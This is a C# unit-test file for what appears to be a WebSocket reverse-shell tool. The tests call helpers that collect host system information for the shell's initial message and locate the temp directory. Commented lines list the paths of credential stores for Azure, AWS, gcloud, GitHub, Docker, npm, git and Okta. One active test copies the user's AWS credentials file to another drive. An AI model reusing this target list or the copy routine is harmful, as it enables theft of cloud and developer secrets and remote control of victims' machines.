using NUnit.Framework;
using NUnit.Framework.Legacy;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.test.utils
{
    [TestFixture]
    internal class OSUtilTest
    {


        [Test]
        public void systemInfo_ValidInput_ReturnsList()
        {
            ReverseShellInfoInitialMessage result = OSUtil.GetComputerInfo();

            /*Console.WriteLine(result);*/

            ClassicAssert.NotNull(result);

        }

        [Test]
        public void getTmp_ValidInput_ReturnsList()
        {
            string result = OSUtil.GetSystemTempDir();

           /* Console.WriteLine(result);*/

            ClassicAssert.NotNull(result);

        }



  

        [Test]
        public void FileExists_ValidInput_ReturnsList()
        {
/*            Console.WriteLine(OSUtil.FileExists("%USERPROFILE%\\.azure\\azureProfile.json"));
            Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gh\\config.yml"));
            Console.WriteLine(OSUtil.FileExists("%UserProfile%\\.aws\\credentials"));
            Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gcloud\\credentials.db"));
            Console.WriteLine(OSUtil.FileExists("%GOOGLE_APPLICATION_CREDENTIALS%"));
            Console.WriteLine(OSUtil.FileExists("%APPDATA%\\gcloud\\application_default_credentials.json"));*/



            /*            "%USERPROFILE%\\.azure\\azureProfile.json",
                        "%USERPROFILE%\\.azure\\accessTokens.json",
                        "%USERPROFILE%\\.docker\\config.json",
                        "%APPDATA%\\gh\\config.yml",
                        "%UserProfile%\\.aws\\credentials",
                        "%UserProfile%\\.aws\\config",
                        "%UserProfile%\\.okta\\okta.yaml",
                        "%USERPROFILE%\\.netrc",
                        "%USERPROFILE%\\.git-credentials",
                        "%USERPROFILE%\\.npmrc",
                        "%APPDATA%\\gcloud\\credentials.db",
                        "%APPDATA%\\gcloud\\application_default_credentials.json",
                        "%USERPROFILE%\\.oci\\config",
                        "%GOOGLE_APPLICATION_CREDENTIALS%",*/
        }

        [Test]
        public void CopyFiles_ValidInput_ReturnsList()
        {
            OSUtil.CopyFileWithNumberPreAppended("%UserProfile%\\.aws\\credentials", "F:\\", 1);

        }






    }
}
